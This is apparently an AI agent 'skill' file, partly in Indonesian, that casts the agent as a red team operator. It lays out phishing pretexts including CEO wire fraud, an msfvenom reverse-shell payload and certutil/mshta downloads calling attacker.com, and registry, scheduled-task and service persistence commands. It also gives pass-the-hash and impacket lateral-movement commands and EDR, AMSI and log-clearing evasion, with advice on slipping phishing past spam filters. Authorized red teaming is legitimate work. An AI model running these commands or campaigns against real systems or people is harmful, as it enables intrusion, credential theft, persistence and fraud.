---
name: red-team-operator
description: "Expert red team operations including adversary simulation, social engineering, persistence techniques, and evasion tactics"
---

# Red Team Operator

## Overview

Skill ini menjadikan AI Agent Anda sebagai spesialis Red Team operations. Agent akan mampu merencanakan dan mengeksekusi adversary simulation, melakukan social engineering assessment, teknik persistence dan lateral movement, serta evasion tactics untuk menguji pertahanan organisasi secara menyeluruh.

## When to Use This Skill

- Use when planning red team engagements
- Use when simulating advanced persistent threats (APT)
- Use when testing detection and response capabilities
- Use when the user asks about offensive security operations
- Use when designing social engineering campaigns

## How It Works

### Step 1: Red Team Kill Chain

```text
┌─────────────────────────────────────────────────────────┐
│              MITRE ATT&CK ALIGNED PHASES                │
├─────────────────────────────────────────────────────────┤
│ 1. RECON         - OSINT, target profiling              │
│ 2. WEAPONIZATION - Payload development, C2 setup        │
│ 3. DELIVERY      - Phishing, USB, watering hole         │
│ 4. EXPLOITATION  - Initial access, vulnerability abuse  │
│ 5. INSTALLATION  - Persistence mechanisms               │
│ 6. C2            - Command & Control communication      │
│ 7. ACTIONS       - Lateral movement, data exfiltration  │
└─────────────────────────────────────────────────────────┘
```

### Step 2: Initial Access Techniques

#### Phishing Campaign

```text
Email Pretexts:
├── IT Support: "Password expiring, reset required"
├── HR/Finance: "Invoice attached", "Salary review"
├── Executive: CEO fraud, urgent wire transfer
└── Vendor: "Updated pricing document"

Technical Components:
├── Domain: typosquat or lookalike domain
├── Payload: Macro-enabled doc, HTA, ISO/IMG
├── Infrastructure: GoPhish, Evilginx2
└── Tracking: Pixel tracking, link clicks
```

#### Payload Development

```bash
# Generate payload with msfvenom
msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=attacker.com LPORT=443 \
  -f exe -o payload.exe

# Obfuscation with Scarecrow
Scarecrow -I payload.bin -Loader binary -domain microsoft.com

# Living off the Land (LOLBins)
# Use legitimate Windows binaries
certutil -urlcache -split -f http://attacker.com/payload.exe
mshta http://attacker.com/payload.hta
```

### Step 3: Persistence Techniques

```powershell
# Registry Run Keys
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /d "C:\path\to\payload.exe"

# Scheduled Task
schtasks /create /tn "SystemUpdate" /tr "C:\path\to\payload.exe" /sc onlogon

# WMI Event Subscription (fileless)
# Survives reboots, hard to detect

# Service Installation
sc create EvilService binPath= "C:\path\to\payload.exe" start= auto
```

### Step 4: Lateral Movement

```bash
# Pass-the-Hash
impacket-psexec -hashes :NTLM_HASH administrator@target

# WMI Execution
impacket-wmiexec domain/user:password@target

# Remote Desktop (RDP)
xfreerdp /u:user /p:password /v:target

# SMB File Copy + Remote Execution
copy payload.exe \\target\C$\Windows\Temp\
impacket-smbexec domain/user:password@target
```

### Step 5: Evasion Techniques

```text
Defense Evasion:
├── AMSI Bypass    - Patch amsi.dll in memory
├── ETW Bypass     - Disable event tracing
├── Unhooking      - Remove EDR hooks from ntdll
├── Process Injection - Inject into legitimate processes
├── Timestomping   - Modify file timestamps
└── Log Clearing   - Clear Windows event logs

C2 Evasion:
├── Domain Fronting - Hide C2 behind CDN
├── DNS over HTTPS  - Encrypted DNS for C2
├── Malleable C2    - Mimic legitimate traffic profiles
└── Sleep Obfuscation - Evade memory scanners
```

### Step 6: Popular Red Team Tools

| Category | Tools |
|----------|-------|
| C2 Frameworks | Cobalt Strike, Sliver, Havoc, Mythic |
| Phishing | GoPhish, Evilginx2, Modlishka |
| Post-Exploitation | Mimikatz, Rubeus, BloodHound |
| Payload Dev | msfvenom, Donut, Scarecrow |
| Recon | theHarvester, Maltego, Shodan |

## Best Practices

### ✅ Do This

- ✅ Get proper authorization (Rules of Engagement) before any operation
- ✅ Document all activities with timestamps
- ✅ Use dedicated infrastructure, never personal assets
- ✅ Have abort procedures ready
- ✅ Focus on testing detection, not just "winning"

### ❌ Avoid This

- ❌ Never operate without written authorization
- ❌ Don't cause actual damage or data loss
- ❌ Don't access data outside scope
- ❌ Don't use techniques that could harm production systems
- ❌ Never reuse infrastructure across engagements

## Common Pitfalls

**Problem:** Getting caught early by EDR
**Solution:** Test payloads against target EDR in lab first. Use process injection and AMSI bypasses.

**Problem:** Phishing emails going to spam
**Solution:** Warm up sending domain, use proper SPF/DKIM/DMARC, test with mail-tester.com.

## Related Skills

- `@senior-penetration-tester` - Technical vulnerability testing
- `@senior-cybersecurity-engineer` - Blue team perspective
- `@network-security-specialist` - Network-level attacks
- `@forensic-investigator` - Understanding what defenders see
